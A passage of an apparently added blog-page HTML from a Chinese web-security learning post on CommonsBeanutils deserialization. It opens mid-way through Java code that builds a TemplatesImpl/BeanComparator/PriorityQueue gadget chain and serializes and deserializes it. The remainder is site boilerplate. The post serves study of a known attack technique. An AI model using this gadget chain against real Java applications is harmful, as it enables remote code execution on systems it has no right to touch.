+        byte[][] codes &#x3D; &#123;code&#125;;
+        bytecodes.set(templates,codes);
+        &#x2F;&#x2F;_tfactory赋值
+        Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+
+&#x2F;&#x2F;        Object transletInstance &#x3D; PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);
+        BeanComparator&lt;Object&gt; objectBeanComparator &#x3D; new BeanComparator&lt;&gt;(&quot;outputProperties&quot;,String.CASE_INSENSITIVE_ORDER);
+        PriorityQueue&lt;Object&gt; objects &#x3D; new PriorityQueue&lt;&gt;(objectBeanComparator);
+        Field size &#x3D; objects.getClass().getDeclaredField(&quot;size&quot;);
+        size.setAccessible(true);
+        size.set(objects,2);
+        Field queue &#x3D; objects.getClass().getDeclaredField(&quot;queue&quot;);
+        queue.setAccessible(true);
+        queue.set(objects,new Object[]&#123;templates,1&#125;);
+        file.serialize(objects,&quot;1.bin&quot;);
+        file.unserialize(&quot;1.bin&quot;);
+
+    &#125;
+&#125;</code></pre>
+
+
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430180306528.png" alt="image-20230430180306528"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Ethe</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Ethe448.github.io/2023/04/27/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://Ethe448.github.io/2023/04/27/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Ethe</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">web学习</span>
+                                </a>
+                            
+                                <a href="/tags/Java/">
+                                    <span class="chip bg-color">Java</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">反序列化</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("https://epicture.oss-cn-beijing.aliyuncs.com/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: '9uxoX9BlIsmwlt8gNkGLF9Ow-gzGzoHsz',
+        appKey: 'rrsgRW80sgJP9PdFwFycskT9',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '8',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/05/07/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/17.jpg" class="responsive-img" alt="fastjson反序列化">
+                        
+                        <span class="card-title">fastjson反序列化</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-05-07
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Ethe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/java/">
+                        <span class="chip bg-color">java</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/04/25/shiro%E5%AE%89%E5%85%A8/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/3.jpg" class="responsive-img" alt="shiro安全">
+                        
+                        <span class="card-title">shiro安全</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Ethe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/java/">
+                        <span class="chip bg-color">java</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/tocbot/tocbot.min.js"></script>
+<script>
+$(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aplayer/APlayer.min.js"></script>
+<script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">Ethe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">231k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Ethe448" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1078240421@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1078240421" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1078240421" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+    <!-- 白天和黑夜主题 -->
+<div class="sum-moon-box">
+  <a class="btn-floating btn-large waves-effect waves-light" onclick="switchNightMode()" title="切换主题" >
+    <i id="sum-moon-icon" class="fas fa-sun" style="width:48px; height:48px; font-size: 28px;"></i>
+  </a>
+</div>
+
+<script>
+  function switchNightMode() {
+    $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+      setTimeout(function () {
+        $('body').hasClass('DarkMode') 
+        ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+        : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+          
+        setTimeout(function () {
+          $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+            $(this).remove()
+          })
+        }, 2e3)
+      })
+  }
+</script>
+
+    <script>
+    //模式判断 
+    if (localStorage.getItem('isDark') === '0') {
+        document.body.classList.add('DarkMode');
+        $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')
+    } else {
+        document.body.classList.remove('DarkMode');
+        $('#sum-moon-icon').removeleClass("fa-sun").addClass('fa-moon')
+    }
+    </script>
+
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/materialize/materialize.min.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aos/aos.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    
+    <script async src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
